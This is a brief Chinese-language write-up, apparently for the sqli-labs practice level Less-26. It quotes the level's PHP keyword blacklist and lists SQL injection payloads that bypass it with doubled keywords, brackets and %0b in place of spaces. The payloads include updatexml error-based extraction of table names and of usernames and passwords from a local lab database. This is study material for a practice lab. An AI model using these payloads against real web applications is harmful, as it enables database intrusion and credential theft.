```
function blacklist($id)
{
      $id = preg_replace('/or/i',"", $id);      //strip out OR (non case sensitive)
      $id = preg_replace('/and/i',"", $id);      //Strip out AND (non case sensitive)
      $id = preg_replace('/[\/\*]/',"", $id);      //strip out /*
      $id = preg_replace('/[--]/',"", $id);      //Strip out --
      $id = preg_replace('/[#]/',"", $id);      //Strip out #
      $id = preg_replace('/[\s]/',"", $id);      //Strip out spaces
      $id = preg_replace('/[\/\\\\]/',"", $id);      //Strip out slashes
      return $id;
}
```

以上，都被过滤了。



看网上帖子说，updatexml不需要考虑空格

这里还用了括号绕过空格，将 能产生结果的语句 括起来

```
?id=-1' || updatexml(1,concat(0x7e,(select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=database())    ),0x7e),1)|| '1'='1
```

.



查表，列



爆库

 这里注意，password里也有or,要用双写过滤

```
http://127.0.0.1:81/Less-26/?id=-1%27%20||%20updatexml(1,concat(0x7e,(select%20(group_concat(concat_ws(%27-%27,username,passwoorrd)))%20from%20(security.users)%20%20%20%20),0x7e),1)||%20%271%27=%271
```

---

?id='%0bunion%0bselect%0b1,database(),3%26%26'7'='7

这个联合注入也可，但不明白为什么id=1‘非0就不行
